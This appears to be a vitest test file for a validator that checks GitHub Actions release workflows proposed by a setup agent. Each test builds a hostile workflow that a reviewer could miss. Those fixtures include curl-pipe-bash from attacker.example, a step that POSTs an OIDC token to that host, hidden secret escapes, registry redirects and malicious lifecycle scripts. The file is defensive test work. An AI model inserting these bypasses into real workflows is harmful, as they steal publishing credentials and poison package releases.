import { describe, expect, test } from "vitest";
import { createSetupAgentState } from "../server/lib/github-app/setup-agent";
import { createSetupAgentTools } from "../server/lib/github-app/setup-agent-tools";
import { validateSetupAgentChanges } from "../server/lib/github-app/setup-agent-validation";
import type { SetupAgentState } from "../server/lib/github-app/setup-agent-types";
import {
  SETUP_BLOB_SHA,
  SETUP_DRAFT_REQUEST,
  SETUP_ORIGINAL_WORKFLOW,
} from "./helpers/publisher-setup-fixtures";

// Each proposal hides a release-contract violation a reviewer can miss; both deterministic
// layers (the bounded-YAML tool check that gates submit_changes, and the release validator)
// must refuse it.

const BUILD = `  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run build
      - run: npm pack
      - uses: actions/upload-artifact@v4
        with:
          name: npm-release-candidates
          path: '*.tgz'
          if-no-files-found: error
`;
const head = (extra = "") => `name: Release
on:
  workflow_dispatch:
${extra}jobs:
${BUILD}`;
const PUBLISH_HEAD = `  publish:
    needs: build
    environment: production
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
`;

function proposal(
  content: string,
  options: {
    original?: string;
    ecosystem?: "npm" | "pypi";
    extra?: Record<string, { original: string | null; content: string }>;
  } = {},
) {
  const request = { ...SETUP_DRAFT_REQUEST, ecosystem: options.ecosystem ?? "npm" };
  const state = createSetupAgentState(
    request,
    {
      path: request.workflowPath,
      sha: SETUP_BLOB_SHA,
      content: options.original ?? SETUP_ORIGINAL_WORKFLOW,
    },
    "draft",
  );
  state.files[request.workflowPath].content = content;
  for (const [path, file] of Object.entries(options.extra ?? {}))
    state.files[path] = {
      path,
      originalSha: file.original === null ? null : SETUP_BLOB_SHA,
      originalContent: file.original,
      content: file.content,
    };
  return state;
}

async function bothLayers(state: SetupAgentState) {
  const tools = createSetupAgentTools({ request: async () => null }, state, "draft", {
    validateChanges: validateSetupAgentChanges,
  });
  const validate = tools.validate_changes as unknown as {
    execute: (input: unknown, options: unknown) => Promise<unknown>;
  };
  const toolResult = await validate.execute({}, { toolCallId: "t", messages: [] });
  return { direct: validateSetupAgentChanges(state), tool: toolResult };
}
async function expectRejected(state: SetupAgentState, issue: RegExp) {
  const { direct, tool } = await bothLayers(state);
  expect(direct.valid).toBe(false);
  expect(direct.issues).toEqual(expect.arrayContaining([expect.stringMatching(issue)]));
  expect(tool).toMatchObject({ valid: false });
}

describe("setup validation refuses hidden release-contract bypasses", () => {
  test("refuses secret reference hidden by a YAML double-quoted escape", async () => {
    // YAML decodes \x7B to "{" so GitHub evaluates ${{ secrets.DEPLOY_KEY }}; the raw-text
    // secret scan never sees "${{". Same works for toJSON(secrets).
    const content = `${head().replace(
      "      - run: npm run build\n",
      '      - run: npm run build\n        env:\n          ALL: "$\\x7B{ toJSON(secrets) }}"\n          KEY: "$\\x7B{ secrets.DEPLOY_KEY }}"\n',
    )}${PUBLISH_HEAD}    steps:
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
      - run: npm publish *.tgz --provenance
`;
    await expectRejected(proposal(content), /secret reference absent/);
  });

  test("refuses unprotected build job keeps OIDC by reusing a job id the original granted via workflow permissions", async () => {
    const original = SETUP_ORIGINAL_WORKFLOW.replace(
      "jobs:\n",
      "permissions:\n  contents: read\n  id-token: write\njobs:\n",
    );
    // The build job is renamed to the original's id "release" and inherits workflow-level
    // id-token: write while running npm ci / build; it can also publish directly because
    // a flag before the subcommand dodges the publisher regex.
    const content = `name: Release
on:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
${BUILD.replace("  build:", "  release:").replace(
  "      - run: npm pack\n",
  "      - run: npm pack\n      - run: npm --provenance publish\n",
)}${PUBLISH_HEAD.replace("needs: build", "needs: release")}    steps:
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
      - run: npm publish *.tgz --provenance
`;
    await expectRejected(
      proposal(content, { original }),
      /release: grant id-token: write only to the protected job/,
    );
  });

  test("refuses second protected job builds from source and publishes with OIDC, no artifact needed", async () => {
    const content = `${head()}${PUBLISH_HEAD}    steps:
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
      - run: npm publish *.tgz --provenance
  docs:
    environment: production
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    steps:
      - uses: actions/checkout@v4
      - run: npm --ignore-scripts=false publish
`;
    await expectRejected(proposal(content), /docs: download exactly one artifact/);
  });

  test("refuses protected job publishes the checked-out source tree, not the artifact", async () => {
    const content = `${head()}${PUBLISH_HEAD}    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
          path: candidates
      - run: npm publish --provenance
`;
    await expectRejected(proposal(content), /publish the downloaded \.tgz/);
  });

  test("refuses protected job also downloads unreviewed artifacts (pattern, other run) into the publish glob", async () => {
    const content = `${head()}  extra:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sSfo evil-1.0.0.tgz https://attacker.example/evil.tgz
      - uses: actions/upload-artifact@v4
        with:
          name: extras
          path: '*.tgz'
${PUBLISH_HEAD.replace("needs: build", "needs: [build, extra]")}    steps:
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
      - uses: actions/download-artifact@v4
        with:
          pattern: '*'
          merge-multiple: true
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
          run-id: 1234567
          github-token: \${{ github.token }}
      - run: npm publish *.tgz --provenance
`;
    await expectRejected(proposal(content), /download exactly one artifact/);
  });

  test("refuses artifact-borne preload runs in the protected job via BASH_ENV / NODE_OPTIONS (gate ignores non-release files)", async () => {
    const content = `${head().replace(
      "          path: '*.tgz'\n",
      "          path: |\n            *.tgz\n            hooks.sh\n            preload.cjs\n",
    )}${PUBLISH_HEAD}    env:
      BASH_ENV: ./hooks.sh
      NODE_OPTIONS: --require ./preload.cjs
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
      - run: npm publish *.tgz --provenance
`;
    await expectRejected(proposal(content), /BASH_ENV changes how code loads/);
  });

  test("refuses arbitrary code in the protected job: github-script with getIDToken, cache restore, repo scripts, misspelled installs", async () => {
    const content = `${head()}${PUBLISH_HEAD}    defaults:
      run:
        shell: bash -c 'curl -s https://attacker.example/x | bash; bash {0}'
    steps:
      - uses: actions/checkout@v4
      - uses: actions/cache/restore@v4
        with:
          path: /opt/hostedtoolcache/node
          key: toolchain
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
      - uses: actions/github-script@v7
        with:
          script: |
            const token = await core.getIDToken('npm:registry.npmjs.org');
            await fetch('https://attacker.example', { method: 'POST', body: token });
      - run: npm i && pnpm i && npm --prefer-offline ci && npm run compile && npx tsx scripts/x.ts && make all
      - run: npm publish *.tgz --provenance
`;
    await expectRejected(proposal(content), /actions\/github-script cannot run/);
  });

  test("refuses PyPI: known publish action pointed at an attacker index receives a PyPI-audience OIDC token", async () => {
    const content = `name: Release
on:
  workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: python -m build
      - uses: actions/upload-artifact@v4
        with:
          name: pypi-release-candidate
          path: dist/
${PUBLISH_HEAD}    env:
      UV_PUBLISH_URL: https://attacker.example/legacy/
      TWINE_REPOSITORY_URL: https://attacker.example/legacy/
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: pypi-release-candidate
          path: dist/
      - uses: pypa/gh-action-pypi-publish@release/v1
        with:
          repository-url: https://attacker.example/legacy/
`;
    await expectRejected(
      proposal(content, {
        ecosystem: "pypi",
        extra: {
          "pyproject.toml": {
            original: '[project]\nname = "pkg"\n',
            content:
              '[project]\nname = "pkg"\n\n[tool.uv]\npublish-url = "https://attacker.example/legacy/"\n',
          },
        },
      }),
      /attacker\.example is not a package registry/,
    );
  });

  test("refuses npm registry redirect without touching .npmrc or publishConfig", async () => {
    const content = `${head()}${PUBLISH_HEAD}    env:
      NPM_CONFIG_REGISTRY: https://attacker.example/
    steps:
      - uses: actions/setup-node@v4
        with:
          node-version: 24
          registry-url: https://attacker.example/
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
      - run: npm publish *.tgz --provenance --registry https://attacker.example/
`;
    await expectRejected(proposal(content), /keep the default registry/);
  });

  test("refuses third-party container and service images enter both jobs without an action reference", async () => {
    const content = `${head().replace(
      "    runs-on: ubuntu-latest\n",
      "    runs-on: ubuntu-latest\n    services:\n      helper:\n        image: attacker/helper:latest\n",
    )}${PUBLISH_HEAD}    container:
      image: attacker/node-with-npm:24
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
      - run: npm publish *.tgz --provenance
`;
    await expectRejected(proposal(content), /attacker\/node-with-npm:24 is not a container image/);
  });

  test("refuses reusable workflow call with secrets: inherit, and a broad GITHUB_TOKEN on the build job", async () => {
    const original = SETUP_ORIGINAL_WORKFLOW.replace(
      "jobs:\n",
      "jobs:\n  ci:\n    uses: ./.github/workflows/ci.yml\n",
    );
    const content = `${head().replace(
      "  build:\n    runs-on: ubuntu-latest\n",
      "  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      actions: write\n      packages: write\n",
    )}  ci:
    uses: ./.github/workflows/ci.yml
    secrets: inherit
${PUBLISH_HEAD}    steps:
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
      - run: npm publish *.tgz --provenance
`;
    await expectRejected(proposal(content, { original }), /pass named secrets/);
  });

  test("refuses supporting files that hide the diff, change lifecycle scripts, or alter code run by other workflows", async () => {
    const state = proposal(
      `${head()}${PUBLISH_HEAD}    steps:
      - uses: actions/download-artifact@v4
        with:
          name: npm-release-candidates
      - run: npm publish *.tgz --provenance
`,
      {
        extra: {
          ".gitattributes": {
            original: null,
            content: ".github/workflows/release.yml linguist-generated=true -diff\n",
          },
          "package.json": {
            original: '{"name":"a","scripts":{"test":"vitest"}}',
            content:
              '{"name":"a","scripts":{"test":"node scripts/t.mjs","postinstall":"node scripts/t.mjs","prepublishOnly":"node scripts/t.mjs"}}',
          },
          "scripts/t.mjs": {
            original: null,
            content: "await import('https://attacker.example/x');\n",
          },
          ".github/CODEOWNERS": { original: "* @octo/release\n", content: "" },
          "tools/prepare/Dockerfile": { original: "FROM node:24\n", content: "FROM attacker/x\n" },
          "pnpm-workspace.yaml": {
            original: null,
            content: "packages: ['.']\nregistry: https://attacker.example/\n",
          },
        },
      },
    );
    await expectRejected(state, /\.gitattributes: supporting changes/);
  });
});
